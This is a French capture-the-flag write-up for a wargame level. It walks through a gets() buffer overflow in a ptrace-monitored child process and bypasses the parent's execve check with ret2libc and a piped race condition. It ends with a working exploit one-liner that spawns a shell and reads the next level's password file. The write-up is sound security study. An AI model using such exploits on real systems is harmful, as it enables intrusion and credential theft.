# level 4 #

Reverse engineering d'un binaire ELF 32-bit, exploitant un `gets()` non sécurisé dans un processus enfant, combiné à une race condition pour contourner une surveillance anti-`execve` mise en place par le processus parent via `ptrace`.

## 1. `main()` — un `fork()`, deux comportements distincts

```asm
call   fork@plt
mov    [esp+0xac], eax   ; sauvegarde du pid retourné
cmp    DWORD PTR [esp+0xac], 0x0
jne    8048769            ; si pid != 0 -> branche parent
```

Dans `main()`, `fork()` est appelé et le programme suit deux chemins totalement différents selon la valeur de retour : le **parent** d'un côté, l'**enfant** de l'autre.

## 2. Branche enfant — buffer non protégé

```asm
mov    [esp], 0x1
call   prctl@plt         ; prctl(PR_SET_PDEATHSIG, SIGHUP)

mov    [esp], 0x0
call   ptrace@plt        ; ptrace(PTRACE_TRACEME, 0, NULL, NULL)

call   puts@plt           ; message d'invite

lea    eax, [esp+0x20]
mov    [esp], eax
call   gets@plt            ; gets(buffer) <-- AUCUNE vérification de taille
```

Côté enfant, on trouve un buffer rempli par `gets()` — encore une fois, aucune vérification de taille sur l'input. C'est la vulnérabilité exploitée.

## 3. Le check anti-exploitation — surveillance côté parent

```asm
call   wait@plt            ; le parent attend un changement d'état de l'enfant
...
mov    [esp], 0x3           ; PTRACE_PEEKUSER
call   ptrace@plt           ; lit orig_eax (offset 44) de l'enfant tracé
cmp    eax, 0xb               ; 0xb = 11 = execve
jne    8048768                ; si différent -> reboucle sur wait()

call   puts@plt                ; message d'alerte
mov    [esp+0x4], 0x9           ; SIGKILL
call   kill@plt                  ; kill(pid, SIGKILL)
```

Le parent **ne fait qu'attendre** que l'enfant se termine (`wait()`), en boucle. Le test `orig_eax == 0xb` ne tue l'enfant que si celui-ci tente un appel à `execve` — grâce au `PTRACE_TRACEME` posé par l'enfant, le noyau stoppe automatiquement le processus tracé au moment de cet appel, ce qui permet au parent de le détecter et de le tuer avant que l'exécution ne se produise.

**Le vrai problème reste `gets()`**, qui permet d'écraser l'adresse de retour sans limite — mais tout shellcode classique basé sur `execve` se fait tuer avant de produire un effet utile.

## 4. Contournement — Ret2Libc et race condition

Puisque tout `execve` direct est détecté, on ne redirige pas l'exécution vers un shellcode injecté, mais vers une fonction déjà présente dans la libc : `system()`. `system()` appelle aussi `execve` en interne, donc en théorie le parent devrait le détecter et tuer le processus de la même façon.

Mais en lançant l'exploit via une **pipe**, le shell ouvert par `system("/bin/sh")` lit et exécute la commande suivante (`cat .pass`) depuis stdin **avant** que le `kill()` du parent n'ait le temps d'agir — une course de vitesse (race condition) exploitée par l'enchaînement de commandes dans le pipe.

## 5. Construction du payload

Payload classique en trois parties, jusqu'à l'adresse de retour :

```
[ padding (156 octets) ] + [ adresse de system() ] + [ adresse de retour factice ] + [ adresse de "/bin/sh" ]
```

- **Padding** : comble le buffer jusqu'à écraser l'adresse de retour sauvegardée
- **Adresse de `system()`** : remplace l'adresse de retour — au `ret`, le programme "appelle" `system()` comme une fonction normale
- **Adresse de retour factice** : où `system()` "retournera" après son exécution
- **Adresse de `"/bin/sh"`** : argument passé à `system()`

## Exploit final

```bash
(python -c 'print ("A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")' ; echo cat /home/users/level05/.pass) | ./level04
```

## Pourquoi ça fonctionne

1. `gets()` permet d'écraser l'adresse de retour sans limite
2. `system("/bin/sh")` est appelé via ret2libc plutôt qu'un shellcode injecté
3. `system()` appelle `execve` en interne, ce qui devrait déclencher la détection du parent — mais le shell ouvert lit et exécute la commande suivante (envoyée via le pipe) avant que le `kill()` du parent ne soit effectif
4. `cat /home/users/level05/.pass` s'exécute dans ce court intervalle → `.pass` lisible

## Résumé

| Élément | Détail |
|---|---|
| Vulnérabilité | `gets()` dans l'enfant — buffer overflow sans limite |
| Protection rencontrée | Le parent trace l'enfant via `ptrace` et tue tout processus qui appelle `execve` |
| Contournement | Ret2Libc — appel de `system()` déjà présent en mémoire, pas de shellcode injecté |
| Offset avant l'adresse de retour | 156 octets |
